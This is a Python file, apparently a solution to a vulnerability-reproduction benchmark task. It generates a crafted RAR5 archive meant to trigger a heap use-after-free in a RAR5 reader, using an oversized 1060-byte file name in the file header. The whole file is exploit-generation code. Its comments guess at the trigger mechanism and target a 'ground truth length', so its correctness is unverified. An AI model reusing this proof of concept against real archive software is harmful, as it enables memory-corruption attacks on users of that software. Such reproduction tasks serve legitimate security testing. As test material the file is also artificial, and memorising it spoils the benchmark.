import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in Rar5 reader.
        The vulnerability involves reading a name size, reading the name, and then checking limits.
        We construct a valid RAR5 file with a File Header containing a name length that is 
        large enough to potentially trigger the check/error path, but fits within the PoC constraints.
        """
        # RAR 5.0 Signature
        sig = b"\x52\x61\x72\x21\x1A\x07\x01\x00"

        def to_vint(n):
            """Encode an integer as a variable-length integer (VINT)."""
            out = bytearray()
            while True:
                byte = n & 0x7F
                n >>= 7
                if n == 0:
                    out.append(byte)
                    break
                else:
                    out.append(byte | 0x80)
            return bytes(out)

        def make_block(header_type, header_flags, specific_data):
            """Construct a RAR5 block with CRC and Size."""
            # Body consists of Header Type (VINT), Header Flags (VINT), and Specific Data
            body = to_vint(header_type) + to_vint(header_flags) + specific_data
            
            # CRC32 is calculated over the body
            crc = zlib.crc32(body) & 0xFFFFFFFF
            
            # Header Size (VINT) is the size of the body
            header_size = to_vint(len(body))
            
            return struct.pack('<I', crc) + header_size + body

        # 1. Main Archive Header (Type 1)
        # Flags: 0 (No extra records, no volume, etc.)
        main_header = make_block(1, 0, b"")

        # 2. File Header (Type 2)
        # Flags: 0 (No extra area, no data area, etc.)
        # Structure of Specific Data for File Header (Flags=0):
        # - Compression Information (VINT)
        # - Host OS (VINT)
        # - Name Length (VINT)
        # - Name Data (Bytes)
        
        # To match ground truth length (~1089 bytes) and trigger the vulnerability:
        # We provide a name length around 1060 bytes. This is likely larger than the
        # internal sanity check (e.g., 255 or 1024), causing the parser to read it
        # and then error out, triggering the UAF in the error handling path.
        name_len = 1060
        name_data = b'A' * name_len
        
        # Params: CompInfo=0, HostOS=0
        file_specific_data = to_vint(0) + to_vint(0) + to_vint(name_len) + name_data
        
        file_header = make_block(2, 0, file_specific_data)

        return sig + main_header + file_header